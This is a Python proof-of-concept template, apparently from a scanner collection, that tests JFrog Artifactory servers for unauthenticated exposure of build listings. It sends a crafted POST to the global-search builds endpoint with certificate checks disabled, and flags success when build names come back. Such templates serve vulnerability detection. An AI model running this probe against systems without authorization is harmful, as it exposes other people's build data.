import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''JFrog Unauthentication Builds''',
        "description": '''''',
        "severity": "medium",
        "references": [
            "https://github.com/jaeles-project/jaeles-signatures/blob/master/common/jfrog-unauth-build-exposed.yaml"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["jfrog"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/ui/api/v1/global-search/builds?jfLoader=true"""
        method = "POST"
        data = {"name":"","before":"","after":"","direction":"desc","order_by":"date","num_of_rows":100}
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""last_build_number""" in resp0.text and """build_name""" in resp0.text) and ("""application/json""" in str(resp0.headers)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url